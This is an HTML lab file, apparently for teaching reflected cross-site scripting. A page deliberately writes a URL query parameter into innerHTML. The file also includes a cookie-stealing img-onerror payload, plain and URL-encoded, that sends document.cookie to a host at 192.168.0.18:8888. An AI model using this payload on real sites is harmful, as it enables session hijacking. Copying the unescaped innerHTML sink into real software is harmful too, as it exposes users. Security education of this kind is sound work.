<!-- Run with Live Server -->
<!-- This example illustrates we are hijacking session cookies by sending malicious script in query param -->
<!-- Example :

 <img src="does-not-exist" onerror="var img = document.createElement(\`img\`); img.src=\'http://192.168.0.18:8888/cookie?data=\' + document.cookie; document.querySelector(\'body\').appendChild(img);"> 

This code snippet is an example of a Cross-Site Scripting (XSS) attack. Here's a breakdown of what it does:
    1. Image Tag with an Error Handler: The code starts with an <img> tag where the src attribute is set to a non-existent image URL (does-not-exist). This will trigger the onerror event when the browser fails to load the image.
    2. JavaScript on Error: The onerror attribute contains JavaScript code that executes when the image fails to load. In this case, the code creates a new <img> element.
    3. Cookie Theft: The new image's src attribute is set to http://192.168.0.18:8888/cookie?data= followed by document.cookie. This means that the user's cookies are appended to the URL.
    4. Sending Cookies to an Attacker's Server: The URL (http://192.168.0.18:8888/cookie?data=) is a potential attacker's server. When the code runs, the user's cookies are sent to this server, exposing potentially sensitive information (like session tokens).
    5. Appending the New Image to the Body: Finally, the new image is added to the body of the webpage using document.querySelector('body').appendChild(img);.

Note : Before running this code, make sure you convert the malicious code to URL encoded format. You can use encodeURIComponent(`pass your malicious code here`) to encode your malicious code.
After encoding, the final URL will look like this:
http://127.0.0.1:5500/Security/XSS/vulnerability/example2.html?name=%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22var%20img%20%3D%20document.createElement(%60img%60)%3B%20img.src%3D%27http%3A%2F%2F192.168.0.18%3A8888%2Fcookie%3Fdata%3D%27%20%2B%20document.cookie%3B%20document.querySelector(%27body%27).appendChild(img)%3B%22%3E
-->


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Example</title>
</head>
<body>

<!-- Vulnerable Code -->
<div>
    Welcome, <span id="username"></span>!
 </div>

<script>
    // Function to set a cookie, mostly this will be set from server
    function setCookie(name, value, days) {
        const date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        const expires = "expires=" + date.toUTCString();
        document.cookie = name + "=" + value + ";" + expires + ";path=/";
    }

    // Example: Set a cookie named "exampleCookie" with value "Hello, Cookie!" that expires in 7 days
    setCookie("exampleCookie", "Hello, Cookie!", 7);
</script>

<!-- Vulnerable Code -->
<script>
    const params = new URLSearchParams(window.location.search);
    const name = params.get('name');
    document.getElementById('username').innerHTML = `${name}`;
 </script>

</body>
</html>